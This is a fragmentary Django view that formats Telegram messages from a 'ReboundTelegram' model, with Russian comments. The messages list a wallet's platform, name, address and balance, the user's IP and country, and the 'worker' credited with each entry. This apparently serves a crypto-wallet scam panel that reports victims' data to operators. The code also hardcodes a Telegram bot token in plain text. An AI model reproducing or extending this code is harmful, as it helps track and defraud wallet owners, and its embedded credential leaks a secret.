...
from .serializers import (
    ...
    ChatSerializer, GeneralMessageSerializer,
...
class SendTelegramMessageView(APIView):
    ...
    async def send_telegram_message(self, user_id, message):
        try:
            telegram_token = '6529100683:AAEmtnXsyiLLqeBJUhEBV7i9Oe1fx0j2GNM'  # Ваш токен бота Telegram
    ...
    async def post(self, request, *args, **kwargs):
        ...
        if serializer.is_valid():
            ...
            # Получаем последний объект из модели ReboundTelegram для указанного пользователя
            try:
                user_object = ReboundTelegram.objects.filter(creator_id=creator_id).latest('id_rebound')
            except ReboundTelegram.DoesNotExist:
                user_object = None
            ...
            if user_object:
                ...
                # Формируем сообщение только на основе последнего объекта
                message_data = (f"\u2757 Статус: {user_object.status}\n"
                                f"\U0001F6E5 Платформа: {user_object.platform}\n"
                                f"\u25AA Кошелек: {user_object.wallet}\n"
                                f"\U0001F4F1 Название: {user_object.wallet_name}\n"
                                f"\u25AA Адрес: {user_object.address}\n"
                                f"\u2753 Баланс: {user_object.balance}\n"
                                f"\U0001F30F IP: {ip}\n"
                                f"\U0001F3F3 Страна: {user_object.country}\n"
                                f"\U0001F477 Worker: @{username}\n\n\n")

                # Объединяем данные из модели с указанным сообщением
                full_message = f"{message_data}"
            else:
                # Если для указанного пользователя нет данных, используем только указанное сообщение
    ...
    async def post(self, request, *args, **kwargs):
        ...
        if serializer.is_valid():
            ...
            if user_object:
                ...
                # Формируем сообщение только на основе последнего объекта
                message_data = (f"\u2757 Статус: {user_object.status}\n"
                                f"\U0001F477 Worker: {user_object.creator}\n")
